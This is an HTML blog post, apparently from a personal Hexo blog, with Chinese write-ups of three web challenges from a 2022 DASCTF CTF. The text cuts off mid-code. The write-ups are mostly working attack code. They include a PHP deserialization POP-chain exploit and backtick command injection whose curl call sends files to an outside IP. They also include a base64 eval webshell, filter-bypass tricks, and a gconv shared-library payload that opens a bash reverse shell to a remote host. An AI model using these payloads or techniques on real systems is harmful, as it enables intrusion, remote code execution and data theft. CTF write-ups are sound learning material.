@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="前言最近状态好差">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022DASCTFXSU三月">
+<meta property="og:url" content="http://example.com/2022/03/30/DASctf%E4%B8%89%E6%9C%88/index.html">
+<meta property="og:site_name" content="Y0ng的博客">
+<meta property="og:description" content="前言最近状态好差">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/963a50498f28840e8b1a25c6f4399556.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/25abd0d7de38f60621e8d675fd5298d9.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/4913e4c50695600452d2d6d1ffc82805.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/dba903b1383806eb5cbe21a4dd28d3c4.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/81c6c51725373547d551aed220fcb5d5.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/6d516d29225ecb8c23fbf9200d0b4ba7.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/9488015094d9d53a53672a2588400027.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/1c0ef7e0011b9cca3bde68e36f67b27e.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/22058e6981e0663be190b1fe79986b9b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/e4dc7b9344ef991fcf08868fa721e219.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/be1b18b42d06e8ba5162f8a5531e6979.png">
+<meta property="article:published_time" content="2022-03-30T03:54:12.324Z">
+<meta property="article:modified_time" content="2022-03-30T03:55:32.438Z">
+<meta property="article:author" content="Y0ng">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/img_convert/963a50498f28840e8b1a25c6f4399556.png">
+
+<link rel="canonical" href="http://example.com/2022/03/30/DASctf%E4%B8%89%E6%9C%88/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>2022DASCTFXSU三月 | Y0ng的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Y0ng的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">0</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">17</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">169</span></a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/30/DASctf%E4%B8%89%E6%9C%88/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cys.jpg">
+      <meta itemprop="name" content="Y0ng">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2022DASCTFXSU三月
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-03-30 11:54:12 / 修改时间：11:55:32" itemprop="dateCreated datePublished" datetime="2022-03-30T11:54:12+08:00">2022-03-30</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%B5%9B%E9%A2%98wp/" itemprop="url" rel="index"><span itemprop="name">赛题wp</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近状态好差</p>
+<a id="more"></a>
+
+<h1 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;v1(<span class="keyword">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v1-&gt;world();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1-&gt;get_flag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;run();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="keyword">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>链子</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fin::destruct -&gt; what::toString -&gt; mix::run -&gt; crow::invoke -&gt; fin::call -&gt; mix::get_flag</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$fin1</span> = <span class="keyword">new</span> fin();</span><br><span class="line"><span class="variable">$fin2</span> = <span class="keyword">new</span> fin();</span><br><span class="line"><span class="variable">$crow</span> = <span class="keyword">new</span> crow();</span><br><span class="line"><span class="variable">$what</span> = <span class="keyword">new</span> what();</span><br><span class="line"><span class="variable">$mix</span> = <span class="keyword">new</span> mix();</span><br><span class="line"><span class="variable">$mix2</span> = <span class="keyword">new</span> mix();</span><br><span class="line"></span><br><span class="line"><span class="variable">$fin1</span>-&gt;f1 = <span class="variable">$what</span>;</span><br><span class="line"><span class="variable">$what</span>-&gt;a = <span class="variable">$mix</span>;</span><br><span class="line"><span class="variable">$mix</span>-&gt;m1 = <span class="variable">$crow</span>;</span><br><span class="line"><span class="variable">$crow</span>-&gt;v1 = <span class="variable">$fin2</span>;</span><br><span class="line"><span class="variable">$fin2</span>-&gt;f1 = <span class="variable">$mix2</span>;</span><br><span class="line"><span class="variable">$mix2</span>-&gt;m1 = <span class="string">&quot;?&gt;&lt;?php phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$fin1</span>);</span><br></pre></td></tr></table></figure>
+
+<h1 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h1><p>info: hack the calc</p>
+<p>说起这道题，比赛完我直接人麻了，意料之外，不蛋bi了…</p>
+<p>逻辑很简单，就是接受字符串做 eval 计算，然后log中只有num部分可控，接着执行了系统命令</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/963a50498f28840e8b1a25c6f4399556.png"></p>
+<p>当然eval肯定是做了过滤了，漏了反引号</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/25abd0d7de38f60621e8d675fd5298d9.png" alt="image-20220328191540666"></p>
+<p>那就构造 <strong>1+1#`ls`</strong> 反弹shell 或者curl外带数据</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/4913e4c50695600452d2d6d1ffc82805.png" alt="image-20220328191818596"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D;1+1#&#96;ls&#96;</span><br><span class="line">?num&#x3D;1%2B1%23%60curl%09http:&#x2F;&#x2F;1.116.110.61:4000%09-F%09xx&#x3D;@.&#x2F;tmp&#x2F;log.txt%60</span><br><span class="line">?num&#x3D;1%2B1%23%60cat%09&#x2F;Th*%60</span><br><span class="line">?num&#x3D;1%2B1%23%60curl%09http:&#x2F;&#x2F;1.116.110.61:4000%09-F%09xx&#x3D;@.&#x2F;tmp&#x2F;log.txt%60</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/dba903b1383806eb5cbe21a4dd28d3c4.png" alt="image-20220328193046046"></p>
+<h1 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h1><p>info: Can you upload me?</p>
+<p>直接上传 <code>&lt;?php phpinfo();?&gt;</code> 可以并且回显文件地址，php8.0.1</p>
+<p>disable_function很离谱,究极究极究极多，看来需要bypass，putenv,mail没有被ban</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/81c6c51725373547d551aed220fcb5d5.png" alt="image-20220328193653166"></p>
+<p>现在就是尝试能不能getshell，show_source没有被ban，上传的时候一直被检测</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6d516d29225ecb8c23fbf9200d0b4ba7.png" alt="image-20220328194333344"></p>
+<p>尝试读文件：</p>
+<p>利用php函数大小写不敏感绕过 <code>&lt;?php Show_source(&#39;../index.php&#39;);?&gt;</code> </p>
+<p>动态绕过 <code>&lt;?php base64_decode(&#39;c2hvd19zb3VyY2U=&#39;)(&#39;../index.php&#39;);?&gt;</code> </p>
+<p>或 <code>&lt;?php echo (&#39;fil&#39;.&#39;e_get_contents&#39;)(&#39;/var/www/html/index.php&#39;);</code></p>
+<blockquote>
+<p>在PHP中，函数名、方法名、类名、关键字不区分大小写；但变量名、常量名区分大小写。</p>
+</blockquote>
+<p>读取到 index.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;eval&quot;</span>,<span class="string">&quot;copy&quot;</span> ,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;usort&quot;</span>,<span class="string">&quot;include&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>,<span class="string">&quot;file&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwriter&quot;</span>,<span class="string">&quot;fput&quot;</span>,<span class="string">&quot;copy&quot;</span>,<span class="string">&quot;curl&quot;</span>,<span class="string">&quot;fread&quot;</span>,<span class="string">&quot;fget&quot;</span>,<span class="string">&quot;function_exists&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;proc_close&quot;</span>, <span class="string">&quot;proc_get_status&quot;</span>,<span class="string">&quot;checkdnsrr&quot;</span>,<span class="string">&quot;getmxrr&quot;</span>,<span class="string">&quot;getservbyname&quot;</span>,<span class="string">&quot;getservbyport&quot;</span>, <span class="string">&quot;syslog&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;highlight_file&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;chmod&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strstr(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//设置上传目录</span></span><br><span class="line">define(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;./uploads&quot;</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;Upload Success!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$ext</span> = pathinfo(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/php/i&quot;</span>, strtolower(<span class="variable">$ext</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;只要好看的php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = file_get_contents(<span class="variable">$temp_file</span>);</span><br><span class="line"><span class="keyword">if</span>(fun(<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;诶，被我发现了吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$new_file_name</span> = md5(<span class="variable">$file_name</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$new_file_name</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;Upload Failed!&#x27;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;</span>.<span class="variable">$msg</span>.<span class="string">&quot; Look here~ &quot;</span>.<span class="variable">$img_path</span>.<span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>就想办法拿shell，学习到两种方法</p>
+<p>一、利用 <strong>include+php伪协议</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">上传一句话木马为1.php</span><br><span class="line">PD9waHAgZXZhbCgkX1BPU1RbImEiXSk7Pz4&#x3D;</span><br><span class="line">伪协议包含</span><br><span class="line">&lt;?php Include(base64_decode(&quot;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT1mM2I5NGU4OGJkMWJkMzI1YWY2ZjYyODI4Yzg3ODVkZC5waHA&#x3D;&quot;));?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/9488015094d9d53a53672a2588400027.png" alt="image-20220330104500440"></p>
+<p>二、内置类<strong>SplFileObject::fwrite</strong> 写文件</p>
+<blockquote>
+<p>由于过滤了 $，我们无法使用变量，过滤了 - 我们无法调用类的动态方法</p>
+<p>由于绝大部分写文件函数都被禁止了，我们考虑使用内置类 SplFileObject::fwrite 进行写文件，写一句话木马</p>
+<p>利用继承，重写一个类，把动态方法调用变成静态方法</p>
+</blockquote>
+<p>(学到了学到了)</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">&quot;EV&quot;</span>, <span class="string">&quot;eva&quot;</span>.<span class="string">&quot;l&quot;</span>);</span><br><span class="line">define(<span class="string">&quot;GETCONT&quot;</span>, <span class="string">&quot;fil&quot;</span>.<span class="string">&quot;e_get_contents&quot;</span>);</span><br><span class="line"><span class="comment">// 由于禁止了$，我们只能从已有的地方获取$符</span></span><br><span class="line">define(<span class="string">&quot;D&quot;</span>,(GETCONT)(<span class="string">&#x27;/var/www/html/index.php&#x27;</span>)[<span class="number">353</span>]);</span><br><span class="line">define(<span class="string">&quot;SHELL&quot;</span>,<span class="string">&quot;&lt;?php &quot;</span>.EV.<span class="string">&quot;(&quot;</span>.D.<span class="string">&quot;_POST[&#x27;a&#x27;]);&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> (GETCONT)(<span class="string">&#x27;./shell.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">splf</span> <span class="keyword">extends</span> <span class="title">SplFileObject</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::fwrite(SHELL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">define(<span class="string">&quot;PHARA&quot;</span>, <span class="keyword">new</span> splf(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1c0ef7e0011b9cca3bde68e36f67b27e.png" alt="image-20220330105929018"></p>
+<p>开始bypass disable，利用shell.php</p>
+<p>payload.c</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void gconv() &#123;&#125;</span><br><span class="line"></span><br><span class="line">void gconv_init() &#123;</span><br><span class="line">  puts(&quot;pwned&quot;);</span><br><span class="line">  system(&quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;1.116.110.61&#x2F;3000 0&gt;&amp;1&#39;&quot;);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>生成so文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc payload.c -o payload.so -shared -fPIC </span><br></pre></td></tr></table></figure>
+
+<p>gconv-modules</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module  PAYLOAD&#x2F;&#x2F;    INTERNAL    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;payload    2</span><br><span class="line">module  INTERNAL    PAYLOAD&#x2F;&#x2F;    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;payload    2</span><br></pre></td></tr></table></figure>
+
+<p>用 <code>SplFileObject</code> 写 <strong>payload.so</strong> 和 <strong>gconv-modules</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://150.158.181.145:8000/payload.so&quot;</span>;</span><br><span class="line"><span class="comment">//$url = &quot;http://150.158.181.145:8000/gconv-modules&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file1</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="variable">$url</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span>(!<span class="variable">$file1</span>-&gt;eof())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="variable">$a</span>.<span class="variable">$file1</span>-&gt;fgets();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file2</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/tmp/payload.so&#x27;</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line"><span class="comment">//$file2 = new 